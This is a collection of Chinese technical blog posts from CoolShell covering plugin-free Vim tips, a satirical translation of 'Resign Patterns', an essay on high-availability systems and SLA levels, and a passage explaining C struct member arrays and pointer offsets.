（全文完）# 无插件Vim编程技巧作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn相信大家看过《简明Vim教程》也玩了《Vim大冒险》的游戏了，相信大家对Vim都有一个好的入门了。我在这里把我日常用Vim编程的一些技巧列出来给大家看看，希望对大家有用，另外，也是一个抛砖引玉的过程，也希望大家把你们的技巧跟贴一下，我会更新到这篇文章中。另外，这篇文章里的这些技巧全都是vim原生态的，不需要你安装什么插件。 **我的Vim的版本是7.2** 。目录* 浏览代码   * 缓冲区   * 窗口分屏浏览   * 分屏同步移动   * Tab页浏览目录   * 保存会话   * Quickfix   * 关键字补全   * 其它技巧     * 字符相关     * 缩进相关     * 复制粘贴相关     * 光标移动相关     * 读取Shell命令相关   * vim的终级插件#### 浏览代码首先，我们先从浏览代码开始。有时候，我们需要看多个文件，所以，传统的做法是，我们开多个tty终端，每个tty里用Vim打开一个文件，然后来回切换。这很没有什么效率。我们希望在一个Vim里打开多个文件，甚至浏览程序目录。
浏览目录的命令很简单：（你也可以直接vim一个目录）> **:E**注意，是大写。于是，你会看到下面这样的界面：这个界面中， **你可以用 j, k 键上下移动，然后回车，进入一个目录，或是找开一个文件** 。你可以看到上面有一堆命令：* 【 – 】 到上级目录   * 【D】删除文件（大写）   * 【R】改文件名（大写）   * 【s】对文件排序（小写）   * 【x】执行文件当然，打开的文件会把现有已打开的文件给冲掉——也就是说你只看到了一个文件。如果你要改变当前浏览的目录，或是查看当前浏览的目录，你可以使用和shell一样的命令：> **:cd <dir> – 改变当前目录** > > **:pwd – 查看当前目录**#### 缓冲区其实，你用:E 浏览打开的文件都没有被关闭，这些文件都在缓冲区中。你可以用下面的命令来查看缓冲区：> **:ls**于是，在你的Vim下，你会看到如下界面：你可以看到Vim打开了四个文件，编号是4，5，6，7，如果你要切换打开的文件，这个时候，你不要按回车（按了也没事，只不过按了就看不到:ls输出的buffer列表了），你可以使用下面的命令切换文件（buffer后面的4表示切到4号文件也就是src/http/ngx_http.c）：
> **:buffer 4**或是：> **:buffer src/http/ngx_http.c**注意，* 你可以像在Shell中输入命令按Tab键补全一样补全Vim的命令。   * 也可以用像gdb一样用最前面的几个字符，只要没有冲突。如：buff你还可以动用如下命令，快速切换：> :bnext 缩写 :bn   >  :bprevious 缩写 :bp   >  :blast 缩写 :bl   >  :bfirst 缩写 :bf上图中，我们还可以看到5有一个%a，这表示当前文件，相关的标记如下：# （交换缓冲区）作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn– （非活动的缓冲区）   a （当前被激活缓冲区）   h （隐藏的缓冲区）   % （当前的缓冲区）   # （交换缓冲区）   = （只读缓冲区）   \+ （已经更改的缓冲区）#### 窗口分屏浏览相信你在《Vim的窗口分屏》一文中，你已经知道了怎么拆分窗口了。其实，我更多的不是用拆分窗口的命令，而是用浏览文件的命令来分隔窗口。如：把当前窗口上下分屏，并在下面进行目录浏览：
> **:He 全称为 :Hexplore （在下边分屏浏览目录）**如果你要在上面，你就在 :He后面加个 !，> **:He! （在上分屏浏览目录）**如果你要左右分屏的话，你可以这样：> **:Ve 全称为 :Vexplore （在左边分屏间浏览目录，要在右边则是 :Ve!）**下图是分别用:He 和 :Ve搞出来的同时看三个文件：在分屏间的跳转和切换在《Vim的窗口分屏》一文中提过了： **先按Ctrl + W，然后按方向键：h j k l**#### 分屏同步移动要让两个分屏中的文件同步移动，很简单，你需要到需要同步移动的两个屏中都输入如下命令（相当于使用“铁锁连环”）：> **:set scb**如果你需要解开，那么就输入下面的命令：> **:set scb!**注：set scb 是 set scrollbind 的简写。#### Tab页浏览目录分屏可能会让你不爽，你可能更喜欢像Chrome这样的分页式的浏览，那么你可以用下面的命令：> **:Te 全称是 :Texplorer**下图中，你可以看到我用Te命令打开了三页，就在顶端我们可以可以看到有三页，其中第一页Tab上的数字3表示那一页有3个文件。
我们要在多个Tabe页中切换，在normal模式下，你可以使用下面三个按键（注意没有冒号）：> **gt – 到下一个页** > > **gT – 到前一个页** > > **{i} gt – i是数字，到指定页，比如：5 gt 就是到第5页**你可以以使用 【:tabm {n}】来切换Tab页。gvim应该是：Ctrl+PgDn 和 Ctrl+PgUp 来在各个页中切换。如果你想看看你现在打开的窗口和Tab的情况，你可以使用下面的命令：> **:tabs**于是你可以看到：使用如下命令可以关闭tab：（当然，我更喜欢使用传统的:q, :wq来关闭）> **:tabclose [i]** – 如果后面指定了数字，那就关闭指定页，如果没有就关闭当前页最后提一下，如果你在Shell命令行下，你可以使用 vim 的 -p 参数来用Tab页的方式打开多个文件，比如：> **vim -p cool.cpp shell.cpp haoel.cpp   >  vim -p *.cpp****注：如果你想把buffer中的文件全转成tab的话，你可以使用下面的命令**> **:bufdo tab split**
#### 保存会话如果你用Tab或Window打开了好些文件的文件，还设置了各种滚屏同步，或是行号……，那么，你可以用下面的命令来保存会话：（你有兴趣你可以看看你的 mysession.vim文件内容，也就是一个批处理文件）> **:mksession ~/.mysession.vim**如果文件重复，vim默认会报错，如果你想强行写入的话，你可以在mksession后加! ：> **:mksession! ~/.mysession.vim**于是下次，你可以这样打开这个会话：> **vim -S ~/.mysession.vim**保存完会话后，你也没有必要一个一个Tab/Windows的去Close。你可以简单地使用：> **:qa – 退出全部** > > **:wqa -保存全部并退出全部**#### Quickfix假如我们有一个hello.cpp文件和一个makefile，于是我们可以直接在vim下输入 :make ， 于是就可以make这个hello.cpp文件，如果出错了，我们需要按回车返回，这个时候，我们可以使用下面的命令来把出错显到在vim的分屏中：> **:cw**
于是，就会出现下面右边的那个样子：（是不是看上去和我一样很帅？）上图中左边是我的makefile，右边是我的错误百出的源代码，右边下面是quickfix窗屏。你可以看到quickfix窗屏指向的第一个错误已经定位到我们相就错误的文件行上了。你可以使用像浏览文件那样用j, k在quckfix窗屏中上下移动到相应的错误上然后按回车，然后就可以在上面的窗屏里定位到相应的源文件的代码行。但是，如果是这样的话， 你要定位下一条错误还得用Ctrl +W 回到quickfix屏中来然后重复来过。你可以使用下面的命令而不用回到quickfix中来：> **:cp 跳到上一个错误** > > **:cn 跳到下一个错误** > > **:cl 列出所有错误** > > **:cc 显示错误详细信息**下面我们来看另一个quickfix的功能。如果你用过vim的cscope插件，你就知道cscope可以用来查找相当的代码，但cscope需要事先生成一个数据库，对一些简单的查找，其实，我们用vim的grep命令就可以了，不需要专门为之生成数据库。vim的grep命令和shell的几乎一样。我们来看个例子：比如我们正在浏览nginx的代码，这时，我想看看哪里用到了nginx的NGX_HTTP_VAR_INDEXED宏。于是，我可以在vim里输入如下的命令：
> **:grep -r –include=”*.[ch]” NGX_HTTP_VAR_INDEXED src/**上面这个命令意思是递归查询src目录下所有的.c和.h文件，其中包括NGX_HTTP_VAR_INDEXED宏。然后，你就会看到vim到shell里去执行并找到了相关的文件，按回车返回vim后，别忘了用 【:cw 】把grep的输出取回来，于是我们就有下面的样子：然后同上面一样，你可以用 j，k 键移动quickfix里的光标到相应的行，然后按回车定位文件，或是使用【:cn】或【:cp】来移动到定位。（这样，你会把多个文件打开到缓冲区，别忘了【:ls】来查看缓冲区）你看，到这里，一个小小的IDE就这样产生了，而且， **最帅的时，我们连一点插件都没有装，也没有在.vimrc文件中配置过什么** 。#### 关键字补全我们还是坚持不用任何插件。我们来看看是怎么个自动补全的。在insert模式下，我们可以按如下快捷键：> 【 **Ctrl +N** 】 – > 当你按下这它时，你会发现Vim就开始搜索你这个目录下的代码，搜索完成了就会出现一个下拉列表（居然是粉紫色的，真是丑死了）
下图是我输入了ngx_http_然后按ctrl+n出现的样子，它已经帮我补全了一个，但是我不想要这个。然后，在Vim的下方我们可以看到状态变成了“关键字补全”，然后后面有^N^P的提示，意思就是告诉你还有一个Ctrl+P.> 【 **Ctrl + P** 】 – 接下来你可以按这个键，于是回到原点，然后你可以按上下光标键来选择相应的Word。对于上面那个例子，我们按下了Ctrl+P后出现下面的这个样子。我们可以看到，光标回到了一开始我输入的位置，然后你可以干两件事，一个是继续输入（这可以帮助过滤关键词），另一个是用“光标键”上移或下移来选择下拉列表中的关键字，选好后回车，就补全了。与此类似的，还有更多的补齐，都在Ctrl +X下面：* Ctrl + X 和 Ctrl + D 宏定义补齐   * Ctrl + X 和 Ctrl + ] 是Tag 补齐   * Ctrl + X 和 Ctrl + F 是文件名 补齐   * Ctrl + X 和 Ctrl + I 也是关键词补齐，但是关键后会有个文件名，告诉你这个关键词在哪个文件中   * Ctrl + X 和 Ctrl +V 是表达式补齐   * Ctrl + X 和 Ctrl +L 这可以对整个行补齐，变态吧。
#### 其它技巧##### 字符相关【guu 】 – 把一行的文字变成全小写。或是【Vu】【gUU】 – 把一行的文件变成全大写。或是【VU】按【v】键进入选择模式，然后移动光标选择你要的文本，按【u】转小写，按【U】转大写【ga】 – 查看光标处字符的ascii码【g8】 – 查看光标处字符的utf-8编码【*】或【#】在当前文件中搜索当前光标的单词##### 缩进相关【>>】向右给它进当前行 【<<】向左缩进当前行【=】 – 缩进当前行 （和上面不一样的是，它会对齐缩进）【=%】 – 把光标位置移到语句块的括号上，然后按=%，缩进整个语句块（%是括号匹配）【G=gg】 或是 【gg=G】 – 缩进整个文件（G是到文件结尾，gg是到文件开头）##### 复制粘贴相关按【v】 键进入选择模式，然后按h,j,k,l移动光标，选择文本，然后按 【y】 进行复制，按 【p】 进行粘贴。【dd】剪切一行（前面加个数字可以剪切n行），【p】粘贴【yy】复制一行（前面加个数字可以复制n行），【p】粘贴##### 光标移动相关【Ctrl + O】向后回退你的光标移动【Ctrl + I 】向前追赶你的光标移动
这两个快捷键很有用，可以在Tab页和Windows中向前和向后trace你的光标键，这也方便你跳转光标。##### 读取Shell命令相关【:r!date】 插入日期上面这个命令，:r 是:read的缩写，!是表明要运行一个shell命令，意思是我要把shell命令的输出读到vim里来。#### vim的终级插件CentOS下：yum erase emacsUbuntu下：apt-get remove emacs对了，以前本站也有一篇小短文《如何在vim中得到你最喜爱的IDE特性》你也可以看看。（:wq）# “另类” 设计模式作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面这篇文章来自这里：，这篇文章有点意思了，山寨了我们著名的Design Pattern。这篇文章并不是很容易翻译，也许我翻译的不好，大家多指正。另外，这篇文章将失去原有的趣味在于其使用了经典设计模式的单词很相似的单词，一走眼你还以为是正二八经的设计模式。呵呵。所以，我在下文中，我会保留原有的英文单词，并把真正的23个经典设计模式的英文名放在旁边（灰色）。这篇文章和之前的如何写出无法维护的代码有异曲同工，个人感觉都是比较欢乐的。
**辞职模式   ****Resign Patterns   ****Design Patterns**不合式的非面向项目软件开发病症   Ailments of Unsuitable Project-Disoriented Software   Elements of Reusable Object-Oriented Software**作者** ：Michael Duell目录* 概要   * 1\. Cremational Patterns 火葬模式 | Creational patterns 创建模式     * 1.1 Abject Poverty 一贫如洗 | Abstract Factory 抽象工厂     * 1.2 Blinder 眼罩模式 | Builder 建造模式     * 1.3 Fallacy Method 错误方法 | Factory method 工厂方法     * 1.4 ProtoTry 尝试模式| Prototype 原型模式     * 1.5 Simpleton 傻瓜模式 | Singleton 单例模式   * 2\. Destructural Patterns 无结构模式 | Structural patterns 结构模式     * 2.1 Adopter 领养者模式 | Adapter 适配器模式     * 2.2 Brig 监狱模式 | Bridge 桥接模式     * 2.3 Compromise 妥协模式 | Composite 合成模式     * 2.4 Detonator 地雷模式 | Decorator 修饰模式     * 2.5 Fromage 干酪模式 | Facade 外观模式     * 2.6 Flypaper 捕蝇纸模式 | Flyweight 享元模式     * 2.7 ePoxy 沥清模式 | Proxy 代理模式   * 3\. Misbehavioral Patterns 行为不检模式| Behavioral Patterns 行为模式     * 3.1 Chain of Possibilities 可能性链模式 | Chain of responsibility 责任链模式     * 3.2 Commando 突击队模式 | Command 命令模式     * 3.3 Intersperser 散布模式| Interpreter 解释器模式     * 3.4 Instigator 煽动模式| Iterator 迭代器模式     * 3.5 Momentum 冲击模式| Memento 备忘模式     * 3.6 Medicator 用药模式| Mediator 媒介模式     * 3.7 Absolver 免责模式| Observer 观察者模式     * 3.8 Stake 利害关系模式 | State 状态模式     * 3.9 Eulogy 颂歌模式 | Strategy策略模式     * 3.10 Tempest Method 暴风雨模式| Template Method 模板方法     * 3.11 Visitor From Hell 地狱访问者模式 | Visitor 访问者模式   * 参考
#### **概要**任何一个熟悉那本由四个人写的经典的设计模式书的朋友，应该知道那本书里的模式都是非常优雅和划时代的。然而，不幸的是，从那些老代码中无法提练出这些模式，因为，在出现这些模式前，大家都不会使用模式。因此，这项工作是从大量的代码中提练出一个模式的目录。这些模式都有充足和永恒的示例。希望你能享受阅读这些模式，但千万不要模仿并使用他们！#### 1\. Cremational Patterns 火葬模式 | Creational patterns 创建模式下面是五个 cremational patterns.##### **1.1 Abject Poverty 一贫如洗 | Abstract Factory 抽象工厂**Abject Poverty 模式能让你的软件相当难测试和维护， 并且需要巨大的财政支出，预算已经完全赤字。##### **1.2 Blinder 眼罩模式 | Builder 建造模式**Blinder 模式是一个应急有效的解决方案，其不需要考虑需求在未来的变化。目前，我们还不太清楚我们为什么叫Blinder模式，一种说法是他们会在写代码的时候被设计人员戴上眼罩，另一种说法是他们希望在维护代码的时候挖出双眼。
##### **1.3 Fallacy Method 错误方法 | Factory method 工厂方法**Fallacy方法主要是在于处理一些不明显的案例。代码逻辑看上去是正确的，当只要某想要去测试一下，或是某个不明显的案例发生了，那些代码中的错误也就出现了。##### **1.4 ProtoTry 尝试模式| Prototype 原型模式**ProtoTry 模式一个快速而肮脏的软件开发工作模型的尝试。这个模式的原意本来是想在后面有时间总结一下教训并改进或重写这些代码，但是可惜的是没有时间。所以，这些代码也就成了众所周知的 legacy code – 旧代码。##### **1.5 Simpleton 傻瓜模式 | Singleton 单例模式**Simpleton 模式，是把一个终极复杂的模式用于那些最最没有价值的工作上。这个模式精确地指出了人员的能力程度。#### **2\. Destructural Patterns 无结构模式 |** Structural patterns 结构模式下面是七个经典的变性模式##### **2.1 Adopter 领养者模式 | Adapter 适配器模式**
Adopter模式提供了一个给那些“孤儿函数”的家。这这些函数和整个大家族别的函数看上去一点也不一样，他们和整个家族的唯一联系就是通过我们的Adopter。##### **2.2 Brig 监狱模式 | Bridge 桥接模式**Brig 模式也就是那些坏代码的容器类。这就是众所周知的软件模块。##### **2.3 Compromise 妥协模式 | Composite 合成模式**Compromise 模式主要用来平衡软件开发的工期和质量。 使用这个模式的结果是——劣质的软件 + 延误的工期。##### **2.4 Detonator 地雷模式 | Decorator 修饰模式**Detonator 模式是极其普通的，在程序中放置一些不易查觉的地雷。一个常见的经典示例是只用两位数来表示年份。这个炸弹已经暴露出来了，并在那等着爆炸！（陈皓注：作者这里说的是千年虫问题，本文写在1997年）##### **2.5 Fromage 干酪模式 | Facade 外观模式**Fromage 模式让软件看上去满是漏洞。 Fromage 模式让我们的软件像Cheesy（芝士，也有劣质的意思）一样，有大量的奇淫巧技让你的软件没有任何一点可移值性。这个模式和奶酪一样，越是老越是香啊。
##### **2.6 Flypaper 捕蝇纸模式 | Flyweight 享元模式**Flypaper 模式的意思是，代码是由设计的人完成，而由另一个人维护。维护着这个模式的那个写代码的人发现自己被粘住了，而且很有可能在软件失支控制前夭折。##### **2.7 ePoxy 沥清模式 | Proxy 代理模式**ePoxy 模式主旨把软件的模式紧密地耦合在一起。随着耦合模块的增加，我们就可以看到沾粘它们的沥清。#### **3\. Misbehavioral Patterns 行为不检模式| Behavioral Patterns 行为模式**下面是11个行为不检点模式##### **3.1 Chain of Possibilities 可能性链模式 | Chain of responsibility 责任链模式**Chain of Possibilities 模式主旨是创造肥大的，拙劣文档的软件模块。没有人知道其功能有多宽泛，其可能性永无止境。也就是我们所说的——无确定性。##### **3.2 Commando 突击队模式 | Command 命令模式**Commando 模式主旨是用来应付工作，让事情快点完成。这个模式不管封装，只图快快把代码写完。反正不犯法。
##### **3.3 Intersperser 散布模式| Interpreter 解释器模式**Intersperser 模式把一个功能的代码散布在系统的各个地方，其可以让功能无法被测试，修改，以及让人读懂。(陈皓注：这让我想起了以前VB，PB和Delphi的开发，功能的逻辑代码散步在各个组件的不同事件中)##### **3.4 Instigator 煽动模式| Iterator 迭代器模式**Instigator 模式看上去是良性的，但是其却大规模的以暴力的方式在破坏软件系统。（陈皓注：作者没有做过多的解释，不过，我想到了Windows编程革命史，应该说的就是这个吧）##### **3.5 Momentum 冲击模式| Memento 备忘模式**Momentum模式让软件大小，内存，CPU，和复杂度成极数级成长。（陈皓注：作者对此没做过多解释，这个特性很像Windows操作系统，每个Windows 的新版本，无论是在尺寸，内存和CPU要求上，和复杂度上都会比上一版有极数级的提高）##### **3.6 Medicator 用药模式| Mediator 媒介模式**Medicator 模式是一个实时的屠夫一样，其把其它的系统搞得就像被打过强力镇静剂一样没有反应。
##### **3.7 Absolver 免责模式| Observer 观察者模式**Absolver模式表现于那些被以前员工开发的代码的问题。对于现任员工，其可以因为很多代码里历史上的问题而免除被批评，其声称其对软件中的任何问题都不负责。这也是我们从所周知的——“这不是我的代码”。（参看：程序员的借口")）##### **3.8 Stake 利害关系模式 | State 状态模式**Stake 模式表现于那些被现已成为经理的人写的代码中的各种问题。虽然这些问题很不爽，但是经理们在这个软件里的利害关系太高了，所以，不能让任何人重写，因为这代表着我们经理的技术成就。##### **3.9 Eulogy 颂歌模式 | Strategy策略模式**Eulogy 模式存在于所有的项目中，也就是 Post-Mortem(事后总结分析会)。##### **3.10 Tempest Method 暴风雨模式| Template Method 模板方法**Tempest Method 主要用在软件快要发布的最后几天。这个模式的物征是，代码中没有注释，并有使用了好几个Detonator Pattern 地雷模式。
##### **3.11 Visitor From Hell 地狱访问者模式 | Visitor 访问者模式**Visitor From Hell 模式一般是在运行时没有检查数组越界的一个巧合。这样一来，我们系统就可以实现Visitor From Hell 模式，因为这样可以造成重要数据的重写。#### 参考* [1] Gamma, E., Helm, R., Johnson, R., Vlissides, J., Design Patterns – Elements of Reusable Object-Oriented Software. Addison-Wesley, 1995.* [2] Michael Duell is an Engineer at AG Communication Systems, where his Resign Patterns have been rejected in favor of the Gang of Four Design Patterns.* [3] “Resign Patterns: Ailments of Unsuitable Project-Disoriented Software,” The Software Practitioner, Vol. 7, No. 3, May-June 1997, p. 14.
（全文完）# 关于高可用的系统作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!HighAvailability-BK在《这多年来我一直在钻研的技术》这篇文章中，我讲述了一下，我这么多年来一直在关注的技术领域，其中我多次提到了工业级的软件，我还以为有很多人会问我怎么定义工业级？以及一个高可用性的软件系统应该要怎么干出来？这样我也可以顺理成章的写下这篇文章，但是没有人问，那么，我只好厚颜无耻的自己写下这篇文章了。哈哈。另外，我在一些讨论高可用系统的地方看到大家只讨论各个公司的技术方案， **其实，高可用的系统并不简单的是技术方案，一个高可用的系统其实还包括很多别的东西，所以，我觉得大家对高可用的系统了解的还不全面，为了让大家的认识更全面，所以，我写下这篇文章** 。目录* 理解高可用系统   * 高可用系统的技术解决方案   * 高可用技术方案的示例   * 高可用性的SLA的定义   * 影响高可用的因素     * 无计划的宕机原因     * 有计划的宕机原因   * 真正决定高可用系统的本质原因   * 其它#### 理解高可用系统首先，我们需要理解什么是高可用，英文叫High Availability（Wikipedia词条），基本上来说，就是要让我们的计算环境（包括软硬件）做到full- time的可用性。在设计上一般来说，需要做好如下的设计：
1. 对软硬件的冗余，以消除单点故障。任何系统都会有一个或多个冗余系统做standby   2. 对故障的检测和恢复。检测故障以及用备份的结点接管故障点。这也就是failover   3. 需要很可靠的交汇点（CrossOver）。这是一些不容易冗余的结点，比如域名解析，负载均衡器等。听起似乎很简单吧，然而不是，细节之处全是魔鬼，冗余结点最大的难题就是对于有状态的结点的数据复制和数据一致性的保证（无状态结点的冗余相对比较简单）。冗余数据所带来的一致性问题是魔鬼中的魔鬼：* 如果系统的数据镜像到冗余结点是异步的，那么在failover的时候就会出现数据差异的情况。* 如果系统在数据镜像到冗余结点是同步的，那么就会导致冗余结点越多性能越慢。所以，很多高可用系统都是在做各种取舍，这需要比对着业务的特点来的，比如银行账号的余额是一个状态型的数据，那么，冗余时就必需做到强一致性，再比如说，订单记录属于追加性的数据，那么在failover的时候，就可以到备机上进行追加，这样就比较简单了（阿里目前所谓的异地双活其实根本做不到状态型数据的双活）。下面，总结一下高可用的设计原理：* 要做到数据不丢，就必需要持久化   * 要做到服务高可用，就必需要有备用（复本），无论是应用结点还是数据结点   * 要做到复制，就会有数据一致性的问题。   * 我们不可能做到100%的高可用，也就是说，我们能做到几个9个的SLA。
#### 高可用系统的技术解决方案我在《分布式系统的事务处理》中引用过下面这个图：这个图来自来自：Google App Engine的co- founder Ryan Barrett在2009年的Google I/O上的演讲《Transaction Across DataCenter》（视频： http://www.youtube.com/watch?v=srOgpXECblk）!Transaction Across DataCenter这个图基本上来说是目前高可用系统中能看得到的所有的解决方案的基础了。M/S、MM实现起来不难，但是会有很多问题，2PC的问题就是性能不行，而Paxos的问题就是太复杂，实现难度太大。总结一下各个高可用方案的的问题：* 对于最终一致性来说，在宕机的情况下，会出现数据没有完全同步完成，会出现数据差异性。   * 对于强一致性来说，要么使用性能比较慢的XA系的两阶段提交的方案，要么使用性能比较好，但是实现比较复杂的Paxos协议。注：这是软件方面的方案。当然，也可以使用造价比较高的硬件解决方案，不过本文不涉及硬件解决方案。另外，现今开源软件中，很多缓存，消息中间件或数据库都有持久化和Replication的设计，从而也都有高可用解决方案，但是开源软件一般都没有比较高的SLA，所以，如果我们使用开源软件的话，需要注意这一点。
#### 高可用技术方案的示例下面，我们来看一下MySQL的高可用的方案的SLA（下图下面红色的标识表示了这个方案有几个9）：!mysql-high-availability-solutions- feb-2015-webinar-9-638图片来源：MySQL High Availability Solutions简单解释一下MySQL的这几个方案（主要是想表达一个越多的9就越复杂）* MySQL Repleaction就是传统的异步数据同步或是半同步Semi-Sync（只要有一个slave收到更新就返回成功）这个方式本质上不到2个9。   * MySQL Fabric简单来说就是数据分片下的M/S的读写分离模式。这个方案的的可用性可以达到99%   * DRBD通过底层的磁盘同步技术来解决数据同步的问题，就是RAID 1——把两台以上的主机的硬盘镜像成一个。这个方案不到3个9   * Solaris Clustering/Oracle VM ，这个机制监控了包括硬件、操作系统、网络和数据库。这个方案一般会伴随着节点间的“心跳机制”，而且还会动用到SAN（Storage Area Network）或是本地的分布式存储系统，还会动用虚拟化技术来做虚拟机的迁移以降低宕机时间的概率。这个解决方案完全就是一个“全栈式的解决方案”。这个方案接近4个9。   * MySQL Cluster是官方的一个开源方案，其把MySQL的集群分成SQL Node 和Data Node，Data Node是一个自动化sharing和复制的集群NDB，为了更高的可用性，MySQL Cluster采用了“完全同步”的数据复制的机制来冗余数据结点。这个方案接近5个9。
那么，这些2个9，3个9，4个9，5个9是什么意思呢？又是怎么来的呢？请往下看。#### 高可用性的SLA的定义**上面那些都不是本文的重点，本文的重点现在开始，如何测量系统的高可用性** 。当然是SLA，全称Service Level Agrement，也就是有几个9的高可用性。工业界有两种方法来测量SLA，* 一个是故障发生到恢复的时间   * 另一个是两次故障间的时间但大多数都采用第一种方法，也就是故障发生到恢复的时间，也就是服务不可用的时间，如下表所示：系统可用性% | 宕机时间/年 | 宕机时间/月 | 宕机时间/周 | 宕机时间/天   ---|---|---|---|---   90% (1个9) | 36.5 天 | 72 小时 | 16.8 小时 | 2.4 小时   99% (2个9) | 3.65 天 | 7.20 小时 | 1.68 小时 | 14.4 分   99.9% (3个9) | 8.76 小时 | 43.8 分 | 10.1 分钟 | 1.44 分   99.99% (4个9) | 52.56 分 | 4.38 分 | 1.01 分钟 | 8.66 秒   99.999% (5个9) | 5.26 分 | 25.9 秒 | 6.05 秒 | 0.87 秒
比如，99.999%的可用性，一年只能有5分半钟的服务不可用。感觉很难做到吧。**就算是3个9的可用性，一个月的宕机时间也只有40多分钟，看看那些设计和编码不认真的团队，把所有的期望寄托在人肉处理故障的运维团队， 一个故障就能处理1个多小时甚至2-3个小时，连个自动化的工具都没有，还好意思在官网上声明自己的SLA是3个9或是5个9，这不是欺骗大众吗？** 。#### 影响高可用的因素老实说，我们很难计算我们设计的系统有多少的可用性，因为影响一个系统的因素实在是太多了，除了软件设计，还有硬件，还有每三方的服务（如电信联通的宽带SLA），当然包括“建筑施工队的挖掘机”。所以，正如SLA的定义， **这不仅仅只是一个技术指标，而是一种服务提供商和用户之间的contract或契约** 。 **这种工业级的玩法，就像飞机一样，并不是把飞机造出来就好了，还有大量的无比专业的配套设施、工具、流程、管理和运营** 。简而言之，SLA的几个9就是能持续提供可用服务的级别，不过，工业界中，会把服务不可用的因素分成两种：一种是有计划的，一种是无计划的。##### 无计划的宕机原因下图来自Oracle的 《High Availability Concepts and Best Practices》
##### !unplaned_downtime有计划的宕机原因下图来自Oracle的 《High Availability Concepts and Best Practices》!planned_downtime我们可以看到，上面的宕机原因包括如下：无计划的* 系统级的故障 – 包括主机、操作系统、中间件、数据库、网络、电源以及外围设备   * 数据和中介的故障 – 包括人员误操作、硬盘故障、数据乱了   * 还有：自然灾害、人为破坏、以及供电问题。有计划的* 日常任务：备份，容量规划，用户和安全管理，后台批处理应用   * 运维相关：数据库维护、应用维护、中间件维护、操作系统维护、网络维护   * 升级相关：数据库、应用、中间件、操作系统、网络、包括硬件升级#### 真正决定高可用系统的本质原因从上面这些会影响高可用的SLA的因素，你看到了什么？如果你还是只看到了技术方面或是软件设计的东西，那么你只看到了冰山一角。我们再仔细想一想， **那个5个9的SLA在一年内只能是5分钟的不可用时间，5分钟啊，如果按一年只出1次故障，你也得在五分钟内恢复故障，让我们想想，这意味着什么？****如果你没有一套科学的牛逼的软件工程的管理，没有牛逼先进的自动化的运维工具，没有技术能力很牛逼的工程师团队，怎么可能出现高可用的系统啊** 。
是的， **要干出高可用的系统，这TMD就是一套严谨科学的工程管理** ，其中包括但不限于了：* 软件的设计、编码、测试、上线和软件配置管理的水平   * 工程师的人员技能水平   * 运维的管理和技术水平   * 数据中心的运营管理水平   * 依赖于第三方服务的管理水平深层交的东西则是——对工程这门科学的尊重：* 对待技术的态度   * 一个公司的工程文化   * 领导者对工程的尊重**所以，以后有人在你面前提高可用，你要看的不是他的技术设计，而还要看看他们的工程能力，看看他们公司是否真正的尊重工程这门科学** 。#### 其它有好些非技术甚至技术人员和我说过，做个APP做个网站，不就是找几个码农过来写写代码嘛。等系统不可用的时候，他们才会明白，要找技术能力比较强的人，但是， **就算你和他们讲一万遍道理，他们也很难会明白写代码怎么就是一种工程了，而工程怎么就成了一门科学了。其实，很多做技术的人都不明白这个道理** 。包括很多技术人员也永远不会理解，为什么要做好多像Code Review、自动化运维、自动化测试、持续集成之类这样很无聊的东西。就像我在《从Code Review 谈如何做技术》中提到的，阿里很多的工程师，架构师/专家，甚至资深架构师都没有这个意识，当然，这不怪他们，因为经历决定思维方式，他们的经历的是民用级的系统，做的都是堆功能的工作，的确不需要。
看完这些，最后让我们都扪心自问一下，你还敢说你的系统是高可用的了么？ ;-)（全文完）# C语言结构体里的成员数组和指针作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn单看这文章的标题，你可能会觉得好像没什么意思。你先别下这个结论，相信这篇文章会对你理解C语言有帮助。这篇文章产生的背景是在微博上，看到@Laruence同学出了一个关于C语言的题，微博链接。微博截图如下。我觉得好多人对这段代码的理解还不够深入，所以写下了这篇文章。!zero_array为了方便你把代码copy过去编译和调试，我把代码列在下面：你编译一下上面的代码，在VC++和GCC下都会在14行的printf处crash掉你的程序。@Laruence 说这个是个经典的坑，我觉得这怎么会是经典的坑呢？上面这代码，你一定会问，为什么if语句判断的不是f.a？而是f.a里面的数组？写这样代码的人脑子里在想什么？还是用这样的代码来玩票？不管怎么样，看过原微博的回复，我个人觉得大家主要还是对C语言理解不深，如果这算坑的话，那么全都是坑。接下来，你调试一下，或是你把14行的printf语句改成：
`printf("%x\n", f.a->s);`你会看到程序不crash了。程序输出：4。 这下你知道了，访问0x4的内存地址，不crash才怪。于是，你一定会有如下的问题：**1）为什么不是 13行if语句出错？f.a被初始化为空了嘛，用空指针访问成员变量为什么不crash？****2）为什么会访问到了0x4的地址？靠，4是怎么出来的？****3）代码中的第4行，char s[0] 是个什么东西？零长度的数组？为什么要这样玩？**让我们从基础开始一点一点地来解释C语言中这些诡异的问题。目录* 结构体中的成员   * 指针和数组的差别   * 关于零长度的数组   * 后记#### 结构体中的成员首先，我们需要知道—— **所谓变量，其实是内存地址的一个抽像名字罢了** 。在静态编译的程序中，所有的变量名都会在编译时被转成内存地址。机器是不知道我们取的名字的，只知道地址。所以有了——栈内存区，堆内存区，静态内存区，常量内存区，我们代码中的所有变量都会被编译器预先放到这些内存区中。有了上面这个基础，我们来看一下结构体中的成员的地址是什么？我们先简单化一下代码：上面代码中，test结构中i和p指针，在C的编译器中保存的是相对地址——也就是说，他们的地址是相对于struct test的实例的。如果我们有这样的代码：
`struct test t;`我们用gdb跟进去，对于实例t，我们可以看到：# t实例中的p就是一个野指针     (gdb) p t     $1 = {i = 0, c = 0 '\000', d = 0 '\000', p = 0x4003e0 "1\355I\211\..."}# 输出t的地址     (gdb) p &t     $2 = (struct test *) 0x7fffffffe5f0#输出(t.i)的地址     (gdb) p &(t.i)     $3 = (char **) 0x7fffffffe5f0#输出(t.p)的地址     (gdb) p &(t.p)     $4 = (char **) 0x7fffffffe5f4我们可以看到，t.i的地址和t的地址是一样的，t.p的址址相对于t的地址多了个4。说白了， **t.i 其实就是( &t + 0x0)**, **t.p 的其实就是 ( &t + 0x4)**。0x0和0x4这个偏移地址就是成员i和p在编译时就被编译器给hard code了的地址。于是，你就知道， **不管结构体的实例是什么——访问其成员其实就是加成员的偏移量** 。
